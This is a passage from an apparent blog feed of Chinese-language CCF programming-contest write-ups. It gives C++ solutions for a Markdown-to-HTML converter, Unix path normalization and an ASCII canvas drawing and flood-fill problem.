punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     line<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;em>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     end<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     line<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>end<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;/em>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">while</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token operator">!=</span>line<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>                     start<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     end<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     string text<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>start<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token operator">-</span>start<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     string link<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span><span class="token operator">-</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     line<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token operator">-</span>start<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;ahref=\""</span><span class="token operator">+</span>link<span class="token operator">+</span><span class="token string">"\">"</span><span class="token operator">+</span>text<span class="token operator">+</span><span class="token string">"&lt;/a>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>              <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span>                            sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span><span class="token keyword">else</span>             <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>                            sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span>              <span class="token punctuation">}</span>              <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>                     end<span class="token operator">=</span>line<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;h"</span><span class="token operator">+</span>t<span class="token punctuation">[</span>end<span class="token operator">-</span>start<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">">"</span><span class="token operator">+</span>line<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>end<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&lt;/h"</span><span class="token operator">+</span>t<span class="token punctuation">[</span>end<span class="token operator">-</span>start<span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">">\n"</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span>              <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;ul>\n"</span><span class="token punctuation">;</span>                            sign<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span>                     temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;li>"</span><span class="token operator">+</span>line<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&lt;/li>\n"</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                     <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;p>"</span><span class="token operator">+</span>line<span class="token punctuation">;</span>                            sign<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>                     <span class="token punctuation">}</span>                     <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                            temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"\n"</span><span class="token operator">+</span>line<span class="token punctuation">;</span>                     <span class="token punctuation">}</span>              <span class="token punctuation">}</span>       <span class="token punctuation">}</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;/ul>\n"</span><span class="token punctuation">;</span>              sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>sign<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>              temp<span class="token operator">+</span><span class="token operator">=</span><span class="token string">"&lt;/p>\n"</span><span class="token punctuation">;</span>              sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       cout<span class="token operator">&lt;&lt;</span>temp<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>       <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200906192057103.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> 状态机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF路径解析---String::find()&amp;&amp;erase()</title>
      <link href="/2020/09/05/lujingjiexi/"/>
      <url>/2020/09/05/lujingjiexi/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201604-3">CCF-201604-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905191548538.GIF#pic_center" alt="下面都不会了"></p><h2><span id="rang-wo-men-xian-lai-kan-yi-xia-ti-mu">让我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905191603668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905191617117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>1.看到这种文本字符处理的题，肯定烦躁，这个简单看着都烦；<br>2.先冷静下来，分析需求；<br>3.输入后，先处理空串和相对路径(+path)；<br>4.一个一个点来消除，先是多余的/，再是/./然后是/../这个要考虑全面<br>5.结束了末尾的/要除掉，但是如果只有一个是要保留的</p><h3><span id="xian-jing">陷阱</span></h3><p>1.后面输入用cin&gt;&gt;str只能拿90分<br>2.反正有些地方很容易掉情况，找了好久，一个一个的试样例就行<br>3.注意一下删除的顺序</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    string path<span class="token punctuation">,</span>str<span class="token punctuation">;</span>    cin<span class="token operator">>></span>path<span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">getline</span><span class="token punctuation">(</span>cin<span class="token punctuation">,</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//cin>>str;        //cin只能拿90 </span>      <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> str<span class="token operator">+</span><span class="token operator">=</span>path<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'/'</span><span class="token punctuation">)</span> str<span class="token operator">=</span>path<span class="token operator">+</span><span class="token string">'/'</span><span class="token operator">+</span>str<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token operator">!=</span>str<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> pos<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"//"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">int</span> cnt<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>          <span class="token keyword">while</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>pos<span class="token operator">+</span>cnt<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'/'</span><span class="token punctuation">)</span> cnt<span class="token operator">++</span><span class="token punctuation">;</span>          str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>cnt<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"/./"</span><span class="token punctuation">)</span><span class="token operator">!=</span>str<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> pos<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"/./"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">while</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"/../"</span><span class="token punctuation">)</span><span class="token operator">!=</span>str<span class="token punctuation">.</span>npos<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> pos<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"/../"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>pos<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>pos<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> begin<span class="token operator">=</span>str<span class="token punctuation">.</span><span class="token function">rfind</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span>pos<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>begin<span class="token punctuation">,</span>pos<span class="token operator">-</span>begin<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">}</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1</span><span class="token operator">&amp;&amp;</span>str<span class="token punctuation">[</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'/'</span><span class="token punctuation">)</span>          str<span class="token punctuation">.</span><span class="token function">erase</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      cout<span class="token operator">&lt;&lt;</span>str<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905192230499.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF画图---一个平平无奇的搜索题bfs</title>
      <link href="/2020/09/05/huatu/"/>
      <url>/2020/09/05/huatu/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201512-3">CCF-201512-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905165639682.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu-ba">我们先来看一下题目吧</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905165701375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905165710593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>就是一个很平常的搜索题<br>1.我们要完成画线和填充，把他简化为两个函数再一一击破</p><h3><span id="zhu-yi-dian">注意点：</span></h3><p><strong>1.x1不一定大于x2，y1不一定大于y2，所以还要处理一下输入数据</strong><br>2.输出格式还要y其实相当于i</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">define</span> mm(a,b) memset(a,b,sizeof(a))</span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> x_dir<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> y_dir<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">line</span><span class="token punctuation">(</span><span class="token keyword">int</span> x1<span class="token punctuation">,</span><span class="token keyword">int</span> y1<span class="token punctuation">,</span><span class="token keyword">int</span> x2<span class="token punctuation">,</span><span class="token keyword">int</span> y2<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>x1<span class="token operator">==</span>x2<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//|</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>y1<span class="token operator">></span>y2<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> temp<span class="token operator">=</span>y1<span class="token punctuation">;</span>          y1<span class="token operator">=</span>y2<span class="token punctuation">;</span>          y2<span class="token operator">=</span>temp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>y1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>y2<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>x1<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'+'</span><span class="token operator">||</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>x1<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'-'</span><span class="token punctuation">)</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>x1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'+'</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>x1<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'|'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>y1<span class="token operator">==</span>y2<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">//-</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>x1<span class="token operator">></span>x2<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> temp<span class="token operator">=</span>x1<span class="token punctuation">;</span>          x1<span class="token operator">=</span>x2<span class="token punctuation">;</span>          x2<span class="token operator">=</span>temp<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>x1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>x2<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>y1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'+'</span><span class="token operator">||</span>map<span class="token punctuation">[</span>y1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'|'</span><span class="token punctuation">)</span>            map<span class="token punctuation">[</span>y1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'+'</span><span class="token punctuation">;</span>          <span class="token keyword">else</span>            map<span class="token punctuation">[</span>y1<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'-'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">fill</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span><span class="token keyword">int</span> y<span class="token punctuation">,</span><span class="token keyword">char</span> c<span class="token punctuation">)</span><span class="token punctuation">{</span>    map<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> nx<span class="token operator">=</span>x<span class="token operator">+</span>x_dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> ny<span class="token operator">=</span>y<span class="token operator">+</span>y_dir<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>nx<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>nx<span class="token operator">>=</span>m<span class="token operator">||</span>ny<span class="token operator">&lt;</span><span class="token number">0</span><span class="token operator">||</span>ny<span class="token operator">>=</span>n<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>ny<span class="token punctuation">]</span><span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'-'</span><span class="token operator">&amp;&amp;</span>map<span class="token punctuation">[</span>ny<span class="token punctuation">]</span><span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'|'</span><span class="token operator">&amp;&amp;</span>map<span class="token punctuation">[</span>ny<span class="token punctuation">]</span><span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'+'</span><span class="token operator">&amp;&amp;</span>map<span class="token punctuation">[</span>ny<span class="token punctuation">]</span><span class="token punctuation">[</span>nx<span class="token punctuation">]</span><span class="token operator">!=</span>c<span class="token punctuation">)</span>          <span class="token function">fill</span><span class="token punctuation">(</span>nx<span class="token punctuation">,</span>ny<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> q<span class="token punctuation">;</span>    cin<span class="token operator">>></span>m<span class="token operator">>></span>n<span class="token operator">>></span>q<span class="token punctuation">;</span>    <span class="token function">mm</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>q<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> flag<span class="token punctuation">;</span>      cin<span class="token operator">>></span>flag<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>          <span class="token keyword">char</span> c<span class="token punctuation">;</span>          cin<span class="token operator">>></span>x<span class="token operator">>></span>y<span class="token operator">>></span>c<span class="token punctuation">;</span>          <span class="token function">fill</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> x1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>y2<span class="token punctuation">;</span>          cin<span class="token operator">>></span>x1<span class="token operator">>></span>y1<span class="token operator">>></span>x2<span class="token operator">>></span>y2<span class="token punctuation">;</span>          <span class="token function">line</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>n<span class="token number">-1</span><span class="token punctuation">;</span>i<span class="token operator">>=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          cout<span class="token operator">&lt;&lt;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905170116829.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bfs </tag>
            
            <tag> 图论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF模板生成系统---字符串都有替身了，木大木大木大！</title>
      <link href="/2020/09/05/mobanshengchengxitong/"/>
      <url>/2020/09/05/mobanshengchengxitong/</url>
      
